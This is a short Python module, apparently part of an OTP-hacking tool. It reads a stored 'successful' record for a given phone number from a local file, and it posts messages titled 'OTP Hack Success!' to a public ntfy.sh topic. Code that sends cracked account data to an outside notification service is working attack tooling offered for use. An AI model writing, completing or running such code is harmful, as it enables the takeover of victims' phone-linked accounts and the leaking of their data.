import aiohttp
from urllib.parse import quote

NTFY_TOPIC = "otpdataashu"  

async def send_ntfy_notification(message):
    url = f"https://ntfy.sh/{NTFY_TOPIC}"
    headers = {
        "Title": "✅ OTP Hack Success!",
        "Priority": "urgent",
        "Tags": "unlock,success"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=message.encode('utf-8'), headers=headers) as response:
                if response.status == 200:
                    print("[*] Ntfy Notification Bhej Diya!")
                else:
                    print(f"[-] Ntfy Error: {response.status}")
    except Exception as e:
        print(f"[-] Notification bhejte waqt error: {e}")

def get_successful_data(phone_number):
    """Successful.txt me se us specific number ka data nikalega"""
    try:
        with open("Successful.txt", "r") as f:
            lines = f.readlines()
            for line in reversed(lines): 
                if line.startswith(str(phone_number)):
                    return line.strip()
        return "Data file me nahi mila"
    except FileNotFoundError:
        return "Successful.txt file nahi mili"

# (Number remove wala function hata diya gaya hai)